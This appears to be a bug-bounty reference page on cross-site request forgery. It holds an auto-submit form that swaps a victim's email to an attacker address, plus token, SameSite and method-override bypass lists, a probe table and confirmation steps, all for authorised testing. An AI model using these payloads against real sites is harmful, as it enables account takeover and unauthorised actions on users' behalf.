---
title: "Payloads: CSRF"
type: payloads
tags: [payloads, csrf, access-control, web]
sources: []
date_created: 2026-06-16
date_updated: 2026-10-31
---

# Payloads: CSRF

Cross-site request forgery + token/SameSite bypass (OWASP A01). Routed via the `hunt-auth` skill. See [[techniques/web/csrf]].

## Basic PoC (auto-submit)
```html
<form action="https://t/account/email" method="POST" id="f">
  <input name="email" value="attacker@evil.com">
</form><script>f.submit()</script>
<!-- GET: --> <img src="https://t/account/delete?id=1">
```

## Token bypass
```
remove the csrf_token param entirely             (often not enforced)
send an empty token   csrf_token=
use your own valid token on the victim (token not bound to session)
reuse an old/another-user's token
change method POST->GET (token only checked on POST)
guessable/static token; token in URL leaks via Referer
```

## Content-Type / JSON CSRF
```
# if endpoint accepts form-encoded too:
<form enctype="text/plain" action="https://t/api"><input name='{"email":"a@evil.com","x":"' value='"}'></form>
# Content-Type swap application/json -> text/plain / multipart to dodge the JSON check
# Flash/CORS-preflight-free simple requests only (GET/POST text/plain)
```

## SameSite bypass
```
SameSite=Lax: top-level GET navigation still sends cookie -> use a GET state-change or method override (_method=PUT)
new cookie within 2 min (Chrome "Lax+POST") window
sibling subdomain (XSS on sub.t.com) -> same-site request
no SameSite attr + old browser -> classic CSRF
```

## Method override / chaining
```
_method=DELETE   X-HTTP-Method-Override: PUT   ?_method=PUT
clickjacking the state-change (if no frame headers) -> see clickjacking
login CSRF: log victim into attacker account -> capture their activity
```

## Real-world
CSRF on email/password change = account takeover; SameSite-Lax + a GET state-change, and JSON endpoints that also accept form bodies, are the recurring bypasses in bug bounty.

## Probe set

| probe | where | expected signal |
|---|---|---|
| token removed | POST state-change | action lands = missing enforcement |
| stale token (old session's) | POST state-change | action lands = token not bound to session |
| cross-account token | POST state-change (two-account rule) | action lands = token not bound to user |
| GET lands the action | state-change endpoint | CSRF-able via simple link/img |
| JSON content-type with form body | JSON API | parser fallback accepts form POST |
| method override header | routed endpoint | `_method=POST` or `X-HTTP-Method-Override` re-routes |
| empty token value | POST state-change | action lands = presence-only check |
| other endpoint's token | POST state-change | action lands = token not bound to this form/action |
| alternate verb (PUT/DELETE) | same endpoint | token check runs on POST only |
| token tied to session, not body | state-change + object param | swap the object id, keep the token = CSRF over IDOR |
| Set-Cookie audit | login response | no SameSite attr = classic CSRF; Lax = top-level GET only |
| double-submit cookie | any state-change | cookie and body compared to each other only = both attacker-settable |
| token in URL | state-change request | leaks via Referer to attacker pages |

## Bypass ladder

| rung | technique |
|---|---|
| 1 | remove the token param entirely |
| 2 | send an empty token |
| 3 | replay your own valid token (not session-bound) |
| 4 | replay an old or cross-account token |
| 5 | swap POST for GET (check on POST only) |
| 6 | method override param or header |
| 7 | content-type swap: form or text/plain body on a JSON endpoint |
| 8 | fresh-cookie Lax+POST window (under 2 min) |
| 9 | same-site vantage: post from an XSS or any subdomain page |
| 10 | login CSRF (victim lands in the attacker account) |

## Confirmation

Finding = one captured request pair in Burp Repeater: the state-change request with the token removed or replaced, plus the response proving the action landed (email changed, settings saved).
Negative control: the identical request with a fresh legit token is the baseline, and a fully logged-out session must be rejected; that proves the token check itself is broken rather than the endpoint being public.
Severity ladder: logout or UI-state CSRF = Low; profile or preference change on the victim = High; email, password, or 2FA change = Critical (account takeover).

## Chaining notes

Chain with IDOR-shaped state changes: the CSRF makes the victim's session perform an action on an object the attacker names.
Email/password/2FA-change CSRF is direct account takeover; see [[techniques/web/csrf]].
Pair with clickjacking when frame headers are missing, and with login CSRF to capture victim activity inside the attacker account.
